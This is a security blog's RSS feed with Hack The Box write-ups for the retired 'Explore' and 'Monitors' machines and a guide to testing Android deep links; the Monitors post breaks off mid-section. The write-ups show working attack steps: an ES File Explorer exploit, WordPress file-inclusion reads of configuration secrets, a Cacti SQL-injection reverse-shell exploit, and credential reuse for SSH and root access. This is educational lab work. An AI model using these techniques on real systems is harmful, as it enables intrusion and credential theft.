<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0" xmlns:media="http://search.yahoo.com/mrss/"><channel><title><![CDATA[null]]></title><description><![CDATA[null]]></description><link>inesmartins.github.io/</link><image><url>inesmartins.github.io/favicon.png</url><title>null</title><link>inesmartins.github.io/</link></image><generator>Ghost 4.7</generator><lastBuildDate>Sat, 13 Nov 2021 13:11:55 GMT</lastBuildDate><atom:link href="inesmartins.github.io/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title><![CDATA[HTB Write-up | Explore]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</blockquote><h2 id="esketit"><a href="https://www.urbandictionary.com/define.php?term=esketit">esketit</a></h2><p>Let&apos;s start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247

PORT     STATE    SERVICE    VERSION
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-explore/</link><guid isPermaLink="false">60df5ec80bafc20a7e3c4b50</guid><category><![CDATA[android]]></category><category><![CDATA[htb]]></category><category><![CDATA[ssh]]></category><category><![CDATA[adb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 30 Oct 2021 19:10:00 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</blockquote><h2 id="esketit"><a href="https://www.urbandictionary.com/define.php?term=esketit">esketit</a></h2><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" alt="HTB Write-up | Explore"><p>Let&apos;s start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247

PORT     STATE    SERVICE    VERSION
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp filtered freeciv</code></pre><p>On Android, the <code>5555</code> TCP port is usually open when the <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> Daemon (ADBD) is running, however, in this case the port is filtered.</p><p>Let&apos;s focus on the other port: the <code>SSH</code> Server application from &quot;Banana Studio&quot; is &#xA0;<a href="https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv">available on Play Store</a> and, as you can see below, supports anonymous login (&quot;username=<code>ssh</code> without any password&quot;):</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-16.23.28.png" class="kg-image" alt="HTB Write-up | Explore" loading="lazy" width="534" height="102"></figure><p>However, it seems like this anonymous login is disabled. I was also not able to brute-force the password using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">a relevant SecList</a>:</p><pre><code>~ hydra -l ssh -P ssh-passwords.txt -s 2222 -t 16 10.10.10.247 ssh</code></pre><p>Let&apos;s expand our scanning to see what else is open:</p><pre><code>~ nmap -p 1-65535 10.10.10.247

2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp filtered freeciv
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn&apos;t have a title (text/plain).</code></pre><p>Nice, another port!</p><p>Doing a bit of Googling we come across <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6447">CVE-2019-6447</a>:</p><blockquote>The ES File Explorer File Manager application through 4.1.9.7.4 for Android allows remote attackers to read arbitrary files or execute applications via TCP port 59777 requests on the local Wi-Fi network. This TCP port remains open after the ES application has been launched once, and responds to unauthenticated application/json data over HTTP.</blockquote><p>In order to exploit this misconfiguration, we can use <a href="https://www.exploit-db.com/exploits/50070">this</a> exploit.</p><p>After some trial and error, and with a bit of luck, I came across the user flag:</p><pre><code>~ python3 50070.py getFile 10.10.10.247 /sdcard/user.txt 

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.

~ htb_explore cat out.dat                                           
f32017174c7c7e8f50c6da52891ae250</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>Let&apos;s continue enumerating using the other available commands for this script:</p><pre><code>~ python3 50070.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

...
name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)
...</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.28.01.png" class="kg-image" alt="HTB Write-up | Explore" loading="lazy" width="908" height="300" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.28.01.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.28.01.png 908w" sizes="(min-width: 720px) 720px"></figure><p>And we got a winner!</p><pre><code>~ ssh kristi@10.10.10.247 -p 2222
&gt; Kr1sT!5h@Rp3xPl0r3!

$ whoami
u0_a76</code></pre><p>Now that we have access to some <code>SSH</code> credentials, let&apos;s forward the traffic from the machine&apos;s <code>adb</code> service to a local port:</p><pre><code>~ adb start-server
* daemon not running; starting now at tcp:5037
* daemon started successfully

~ ssh -i ssh_key kristi@10.10.10.247 -L 5555:127.0.0.1:5555 -p 2222
&gt; Kr1sT!5h@Rp3xPl0r3!

$ whoami
u0_a76</code></pre><p>Then, on another tab on the local machine we can connect to the local service:</p><pre><code>~ adb connect 127.0.0.1:5555
connected to 127.0.0.1:5555

~ adb shell

$ whoami
shell</code></pre><p>Now let&apos;s see if we can authenticate as <code>root</code>:</p><pre><code>$ su - root

$ whoami
root

$ cd data      

$ ls
adb           bootchart     media       property       tombstones 
anr           cache         mediadrm    resource-cache user       
app           dalvik-cache  misc        root.txt       user_de    
app-asec      data          misc_ce     ss             vendor     
app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce  
app-lib       es_starter.sh nfc         system         vendor_de  
app-private   local         ota         system_ce      
backup        lost+found    ota_package system_de      

$ cat root.txt
f04fc82b6d49b41c9b08982be59338c5</code></pre><p>Done :)</p>]]></content:encoded></item><item><title><![CDATA[Exploiting Deep Links in Android - Part 5 (Testing)]]></title><description><![CDATA[<h2 id="enumeration">Enumeration</h2><p>Enumeration should always start with the <a href="https://www.google.com/search?q=Android+Manifest&amp;rlz=1C5CHFA_enPT957PT957&amp;oq=Android+Manifest&amp;aqs=chrome..69i57j69i60.222j0j7&amp;sourceid=chrome&amp;ie=UTF-8">App Manifest</a>, which can be extracted from any <code>.apk</code> with a tool such as <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, e.g.:</p><pre><code>~ apktool d com.twitter.android_2021-10-22.apk 
I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk
I: Loading resource table...
I: Decoding AndroidManifest.</code></pre>]]></description><link>inesmartins.github.io/exploiting-deep-links-in-android-pat-5-testing/</link><guid isPermaLink="false">617d78ac3eb63780007bc5e3</guid><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 30 Oct 2021 17:20:05 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg" medium="image"/><content:encoded><![CDATA[<h2 id="enumeration">Enumeration</h2><img src="inesmartins.github.io/content/images/2021/10/maxresdefault-1-1.jpeg" alt="Exploiting Deep Links in Android - Part 5 (Testing)"><p>Enumeration should always start with the <a href="https://www.google.com/search?q=Android+Manifest&amp;rlz=1C5CHFA_enPT957PT957&amp;oq=Android+Manifest&amp;aqs=chrome..69i57j69i60.222j0j7&amp;sourceid=chrome&amp;ie=UTF-8">App Manifest</a>, which can be extracted from any <code>.apk</code> with a tool such as <a href="https://ibotpeaches.github.io/Apktool/">apktool</a>, e.g.:</p><pre><code>~ apktool d com.twitter.android_2021-10-22.apk 
I: Using Apktool 2.5.0 on com.twitter.android_2021-10-22.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /Users/inesmartins/Library/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Baksmaling classes2.dex...
I: Baksmaling classes3.dex...
I: Baksmaling classes4.dex...
I: Baksmaling classes5.dex...
I: Baksmaling classes6.dex...
I: Baksmaling classes7.dex...
I: Baksmaling classes8.dex...
I: Baksmaling classes9.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
I: Copying META-INF/services directory

~ open com.twitter.android_2021-10-22/AndroidManifest.xml</code></pre><p>When you open the manifest, you should start by looking for <code>&lt;intent-filter&gt;</code> elements:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/10/Screenshot-2021-10-30-at-18.24.30.png" class="kg-image" alt="Exploiting Deep Links in Android - Part 5 (Testing)" loading="lazy"></figure><p>Note the <strong>scheme</strong>, <strong>host</strong> and <strong>path</strong> attributes inside <code>&lt;data&gt;</code> elements to understand what deep links are supported, and check the <code>category</code> and <code>action</code> elements, as they give you clues about how the deep links are used.</p><p>The example below shows a Scheme URL with <code>scheme=&quot;myapp&quot;</code> and <code>host=&quot;path&quot;</code>, which means the following URI could be handled by the app: <code>myapp://path</code>.</p><pre><code>&lt;activity android:name=&quot;.MyUriActivity&quot;&gt;
  &lt;intent-filter&gt;
      &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&gt;
      &lt;data android:scheme=&quot;myapp&quot; android:host=&quot;path&quot; /&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;</code></pre><p>When analysing app links, make sure the intent filter includes the &#xA0;<code>android:autoVerify=&quot;true&quot;</code> attribute, which enables app link verification:</p><pre><code>&lt;activity android:name=&quot;.MyUriActivity&quot;&gt;
  &lt;intent-filter android:autoVerify=&quot;true&quot;&gt;
      &lt;action android:name=&quot;android.intent.action.VIEW&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.DEFAULT&quot; /&gt;
      &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot; /&gt;
      &lt;data android:scheme=&quot;http&quot; android:host=&quot;www.myapp.com&quot; android:path=&quot;/my/app/path&quot; /&gt;
      &lt;data android:scheme=&quot;https&quot; android:host=&quot;www.myapp.com&quot; android:path=&quot;/my/app/path&quot; /&gt;
  &lt;/intent-filter&gt;
&lt;/activity&gt;
</code></pre><hr><h2 id="verifying-app-link-association">Verifying App Link Association</h2><p>The simplest way to check if a link is correctly verified is to just enter it onto a mobile browser and check that the link is automatically (without any user interaction) opened with the intended app.</p><p>If you&apos;re looking for additional information, you can also use <a href="https://github.com/inesmartins/Android-App-Link-Verification-Tester/blob/main/README.md">this</a> simple Python tool that I&apos;ve developed. This library supports a bunch of different test modes and options, but most likely the <code>verify-applinks</code> option will give you what you need:</p><pre><code class="language-Python">~ python3 Android-App-Link-Verification-Tester/deeplink_analyser.py \
-apk com.twitter.android_2021-10-22.apk \
-p com.twitter.android \
-op verify-applinks

[...]

The APK&apos;s signing certificate&apos;s SHA-256 fingerprint is: 
0F:D9:A0:CF:B0:7B:65:95:09:97:B4:EA:EB:DC:53:93:13:92:39:1A:A4:06:53:8A:3B:04:07:3B:C2:CE:2F:E9

[...]

Checking http://mobile.twitter.com/.*

&#x2713; includes autoverify=true
&#x2713; includes VIEW action
&#x2713; includes BROWSABLE category
&#x2713; includes DEFAULT category
&#x2713; DAL verified

  Relations: 
    - [Standard] delegate_permission/common.get_login_creds
    - [Standard] delegate_permission/common.handle_all_urls
    - [Custom]   delegate_permission/common.use_as_origin

Checking http://twitter.com/.*

&#x2713; includes autoverify=true
&#x2713; includes VIEW action
&#x2713; includes BROWSABLE category
&#x2713; includes DEFAULT category
&#x2713; DAL verified

  Relations: 
    - [Standard] delegate_permission/common.get_login_creds
    - [Standard] delegate_permission/common.handle_all_urls
    - [Custom]   delegate_permission/common.use_as_origin

[...]

Read more about relation strings here: https://developers.google.com/digital-asset-links/v1/relation-strings</code></pre><hr><h2 id="static-and-dynamic-analysis">Static and Dynamic Analysis</h2><p>In order to understand what data is being taken from deep links and how that data is being processed, check for occurrences of:</p><ul><li><code>getIntent()</code> </li><li><code>.getData()</code></li><li><code>.getExtras()</code></li><li>Regex search: <code>\.get\w+Extra\(</code> &#xA0;-&gt; finds occurrences <code>.getStringExtra(</code>, &#xA0;<code>.getParcelableExtra(</code>, etc.)</li></ul><p>To understand how the app&#x2019;s <code>WebViews</code> are controlling which URLs are loaded and how, look for:</p><ul><li><code>shouldOverrideUrlLoading</code> </li><li><code>shouldInterceptRequest</code></li></ul><p>Finally, to see how the data or URIs are being loaded into the app&apos;s <code>WebViews</code>, check for any calls to:</p><ul><li><code>.loadUrl(</code> </li><li><code>.loadData(</code></li></ul><p>Note that, not only are these methods relevant when doing static analysis, you can also &quot;hook&quot; them with <a href="https://frida.re/docs/android/">Frida</a> when doing dynamic analysis.</p><hr><h2 id="automated-tests-and-fuzzing">Automated Tests and Fuzzing</h2><p>If you already know which deep link you you want to test, <a href="https://developer.android.com/studio/command-line/adb">adb</a> is the way to go:</p><pre><code>~ adb shell am start -W -a android.intent.action.VIEW -d &lt;url&gt;

where:
-a ~&gt; action
-W ~&gt; wait for launch to complete
-d ~&gt; URL</code></pre><p>If you want to build and send a specific Intent URL, you can create a new Android app using <a href="https://developer.android.com/studio?gclid=CjwKCAjw2vOLBhBPEiwAjEeK9up2NghnnyViWFBXSe8F-3DO0-kSFC9KH7g6q3xdkSb5GD0_g5q4nRoCiLEQAvD_BwE&amp;gclsrc=aw.ds">Android Studio</a>, as shown below:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="https://lh4.googleusercontent.com/Yls7-O6Tjiy2gubg8v5SgKsTNiepUjuFaKAkvyn7CoHma9N7lpihmPKHnwrAhba7jvXyfqCx7o3mhMrTnOHOhqWAQ_UuV2ZEy8Nm-w9_Ix2gs1M2S9Ds8m1tQ1bTB9wop5yFqDOwIkk" class="kg-image" alt="Exploiting Deep Links in Android - Part 5 (Testing)" loading="lazy"></figure><p>Finally, if you have no idea what you&apos;re looking for, maybe give fuzzing a try with <a href="https://labs.f-secure.com/tools/drozer/">drozer</a>&apos;s <a href="https://github.com/FSecureLABS/drozer-modules/blob/master/intents/fuzzinozer.py">fuzzinozzer</a> module:</p><pre><code>dz&gt; run intents.fuzzinozer --complete_test --package com.twitter.android --save_state</code></pre><hr><p>And this is it, the end of the road for this series.<br>Hope you learned something!</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Monitors]]></title><description><![CDATA[<blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Monitors">here</a>.</blockquote><h2 id="scanning">Scanning</h2><p>Let&apos;s start the same as always, with a basic <code>nmap</code> scan:</p><pre><code>~ nmap -sC -sV -A 10.10.10.238

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
Nmap scan report for 10.10.10.238
Host is</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-monitors/</link><guid isPermaLink="false">608d24d93241306f9f095bbd</guid><category><![CDATA[htb]]></category><category><![CDATA[wordpress]]></category><category><![CDATA[wpscan]]></category><category><![CDATA[wp-with-spritz]]></category><category><![CDATA[LFI]]></category><category><![CDATA[cacti]]></category><category><![CDATA[rce]]></category><category><![CDATA[sqli]]></category><category><![CDATA[sql injection]]></category><category><![CDATA[docker]]></category><category><![CDATA[apache ofbiz]]></category><category><![CDATA[metasploit]]></category><category><![CDATA[privesc]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 09 Oct 2021 16:17:00 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-17.10.05.png" medium="image"/><content:encoded><![CDATA[<blockquote>Retired machine can be found <a href="https://app.hackthebox.eu/machines/Monitors">here</a>.</blockquote><h2 id="scanning">Scanning</h2><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-17.10.05.png" alt="HTB Write-up | Monitors"><p>Let&apos;s start the same as always, with a basic <code>nmap</code> scan:</p><pre><code>~ nmap -sC -sV -A 10.10.10.238

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-01 11:15 WEST
Nmap scan report for 10.10.10.238
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn&apos;t have a title (text/html; charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>There&apos;s an <code>Apache</code> web server running on port 80 but we can&apos;t access it with the IP alone:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="723" height="179" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image.png 600w, inesmartins.github.io/content/images/2021/05/image.png 723w" sizes="(min-width: 720px) 720px"></figure><p>Luckily the virtual host is pretty obvious:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.10.238    monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-2.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="1440" height="720" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-2.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-2.png 1000w, inesmartins.github.io/content/images/2021/05/image-2.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>According to the footer the website was built using Wordpress, so let&apos;s run <a href="https://wpscan.com/wordpress-security-scanner">wpscan</a>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/05/image-19.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="726" height="341" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-19.png 600w, inesmartins.github.io/content/images/2021/05/image-19.png 726w" sizes="(min-width: 720px) 720px"></figure><p>The tool found that this instance was using the <a href="http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txt">WP with Spritz</a> plugin, more specifically version 1.0, which is vulnerable to unauthenticated RFI.</p><p>As shown on <a href="https://www.exploit-db.com/exploits/44544">this</a> ExploitDB POC, all we need to do to is call a particular path inside the plugin directory - <code>wp.spritz.content.filter.php</code> - with a specific parameter - <code>url</code> - and we can see the content of any accessible file in the system, e.g.:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-55.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="877" height="551" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-55.png 600w, inesmartins.github.io/content/images/2021/05/image-55.png 877w"></figure><hr><h2 id="enumerating-with-lfi">Enumerating with LFI</h2><p><code>marcus</code> looks like the most interesting user, and it seems like we&apos;re able to access their home directory, but we can&apos;t read <code>user.txt</code>. </p><p>Let&apos;s try to read the Wordpress configuration file:</p><pre><code>~ curl http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=../../../wp-config.php</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-51.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="959" height="813" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-51.png 600w, inesmartins.github.io/content/images/2021/05/image-51.png 959w"></figure><p>So, we have the db name, user and password (which might be re-used somewhere else):</p><pre><code>DB_NAME: &apos;wordpress&apos;
DB_USER: &apos;wpadmin&apos;
DB_PASSWORD: &apos;BestAdministrator@2020!&apos;</code></pre><p>Unfortunately, we don&apos;t have permissions to access the database locally and can&apos;t access the service from a remote machine. So, let&apos;s try some more enumeration using a <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi-linux-list">handy list</a>:</p><pre><code class="language-python">import os

baseurl = &apos;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php\?url\=/&apos;

entries = open(&apos;lfi_payloads.txt&apos;, &apos;r&apos;).read().split(&apos;\n&apos;)

for entry in entries:
	print(&apos;Trying &apos; + entry)
	os.system(&apos;curl &apos; + baseurl + entry + &apos; -O&apos;)</code></pre><p>After some trial and error we finally get something interesting on <code>etc/apache2/sites-enabled/000-default.conf</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-67.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><hr><h2 id="exploring-cacti-admin">Exploring cacti-admin</h2><p>Let&apos;s configure our new virtual host and access the website:</p><pre><code>~ sudo nano /etc/hosts

...
10.10.10.238    cacti-admin.monitors.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-68.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="1440" height="747" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-68.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-68.png 1000w, inesmartins.github.io/content/images/2021/05/image-68.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Luckily we can use the credentials we found on the last step and get in: <code>admin</code>/<code>BestAdministrator@2020!</code></p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-71.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy" width="1440" height="647" srcset="inesmartins.github.io/content/images/size/w600/2021/05/image-71.png 600w, inesmartins.github.io/content/images/size/w1000/2021/05/image-71.png 1000w, inesmartins.github.io/content/images/2021/05/image-71.png 1440w" sizes="(min-width: 1200px) 1200px"></figure><p>Going through the source code, we see that this application is using <a href="https://github.com/Cacti/cacti/releases/tag/release%2F1.2.12">Cacti version 1.2.12</a>, which has a lot of known vulnerabilities including an RCE via SQL Injection.</p><p>And better yet, there&apos;s a <a href="https://www.exploit-db.com/exploits/49810">working payload on ExploitDB</a>:</p><pre><code>~ python cacti_exploit.py -t http://cacti-admin.monitors.htb -u admin -p BestAdministrator@2020! --lhost 10.10.14.122 --lport 4444
[+] Connecting to the server...
[+] Retrieving CSRF token...
[+] Got CSRF token: sid:105acde9cf997ef401f3eaaf5a884e62c9776fa1,1620939044
[+] Trying to log in...
[+] Successfully logged in!

[+] SQL Injection:
&quot;name&quot;,&quot;hex&quot;
&quot;&quot;,&quot;&quot;
&quot;admin&quot;,&quot;$2y$10$TycpbAes3hYvzsbRxUEbc.dTqT0MdgVipJNBYu8b7rUlmB8zn8JwK&quot;
&quot;guest&quot;,&quot;43e9a4ab75570f5b&quot;

[+] Check your nc listener!</code></pre><p>And we have a shell!</p><pre><code>$ whoami
www-data</code></pre><p>Let&apos;s upgrade it to an interactive shell:</p><pre><code>~ python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;
www-data@monitors:/usr/share/cacti/cacti</code></pre><hr><h2 id="getting-user">Getting user</h2><pre><code>www-data@monitors:/home/marcus$ su marcus
Password: BestAdministrator@2020!</code></pre><p>After failing to get anything interesting on the user&apos;s home directory, I tried to find all files with string &quot;marcus&quot;:</p><pre><code>$ grep &quot;marcus&quot; /etc -R 2&gt;/dev/null

/etc/group-:marcus:x:1000:
/etc/subgid:marcus:165536:65536
/etc/group:marcus:x:1000:
/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh
/etc/subuid:marcus:165536:65536
/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash
</code></pre><p>The <code>cacti-backup</code> service looks interesting:</p><pre><code>$ cat /etc/systemd/system/cacti-backup.service
[Unit]
Description=Cacti Backup Service
After=network.target

[Service]
Type=oneshot
User=www-data
ExecStart=/home/marcus/.backup/backup.sh

[Install]
WantedBy=multi-user.target</code></pre><p>Let&apos;s see if we can read the script that&apos;s being called:</p><pre><code>$ cat /home/marcus/.backup/backup.sh

#!/bin/bash

backup_name=&quot;cacti_backup&quot;
config_pass=&quot;VerticalEdge2020&quot;

zip /tmp/${backup_name}.zip /usr/share/cacti/cacti/*
sshpass -p &quot;${config_pass}&quot; scp /tmp/${backup_name} 192.168.1.14:/opt/backup_collection/${backup_name}.zip
rm /tmp/${backup_name}.zip</code></pre><p>That&apos;s an interesting password &#x1F609;</p><pre><code>$ su marcus
su marcus
Password: VerticalEdge2020

marcus@monitors:/usr/share/cacti/cacti$ cat /home/marcus/user.txt
cat /home/marcus/user.txt
1f9e04959870f6cd3c13216d0cf00583</code></pre><p>And now we&apos;re able to access via SSH, which is a lot easier:</p><pre><code>~ ssh marcus@monitors.htb
marcus@monitors.htb&apos;s password:
&gt; VerticalEdge2020

...

marcus@monitors:~$</code></pre><hr><h2 id="red-herring">Red Herring</h2><p>It seems like <code>marcus</code> left a note in their home directory:</p><pre><code>marcus@monitors:~$ cat note.txt

TODO:

Disable phpinfo	in php.ini		- DONE
Update docker image for production use	-</code></pre><p>Since the Docker image might be deprecated, let&apos;s filter out all of the processes running on the machine that are Docker-related:</p><pre><code>$ ps aux | grep docker

root       1527  0.0  2.0 1196956 82704 ?       Ssl  11:42   0:04 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock

root       2006  0.1  0.2 628508  8864 ?        Sl   11:42   0:15 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443

root       2039  0.0  0.1 108820  5768 ?        Sl   11:42   0:01 containerd-shim -namespace moby -workdir /var/lib/containerd/io.containerd.runtime.v1.linux/moby/a2e16ca5647428c5f43ce47fd08272fd8738ed80d3db0e6cf4bcb15370bbf184 -address /run/containerd/containerd.sock -containerd-binary /usr/bin/containerd -runtime-root /var/run/docker/runtime-runc</code></pre><p>Note that all of these are ran by <code>root</code>, and the <code>docker</code> group doesn&apos;t contain any user, which means we can&apos;t use most of the known privesc Docker vectors:</p><pre><code>$ cat /etc/group | grep docker
docker:x:999:
$ cat /etc/passwd | grep 999</code></pre><p>Let&apos;s see what else we can find about this instance of <code>Docker</code> with <a href="https://github.com/stealthcopter/deepce">deepce</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-16.07.27.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><p>There doesn&apos;t seem to be a known vulnerability for the current Docker version, so we need to go another route.</p><hr><h2 id="apache-ofbiz">Apache OFBiz</h2><p>We know that <code>docker-proxy</code> is mapping the host TCP port <code>8443</code> to the container&apos;s (<code>172.17.0.2</code>) TCP port <code>8443</code>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-15.43.35.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><p>So we can SSH tunnel to see what&apos;s running on the container:</p><pre><code>~ ssh -L 8443:localhost:8443 marcus@monitors.htb  -fNT 
marcus@monitors.htb&apos;s password: 
&gt; VerticalEdge2020

~ ps aux | grep 8443
inesmartins      38886   0.0  0.0  4331440    648   ??  Ss   12:35PM   0:00.00 ssh -L 8443:localhost:8443 marcus@monitors.htb -fNT
</code></pre><p>When we access this address on our local browser we can see this page:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/05/image-92.png" class="kg-image" alt="HTB Write-up | Monitors" loading="lazy"></figure><p>A quick scan of the port tells us that the <code>SSL</code> certificate was emitted for <code>ofbiz-vm.apache.org</code>, which points to an <a href="https://ofbiz.apache.org/">Apache OFBiz</a> applications.</p><pre><code>~ nmap -sC -sV -A localhost -p 8443

PORT     STATE SERVICE  VERSION

8443/tcp open  ssl/http Apache Tomcat 9.0.31
|_http-title: Site doesn&apos;t have a title (text/plain;charset=UTF-8).
| ssl-cert: Subject: commonName=ofbiz-vm.apache.org/organizationName=Apache Software Fundation/stateOrProvinceName=DE/countryName=US
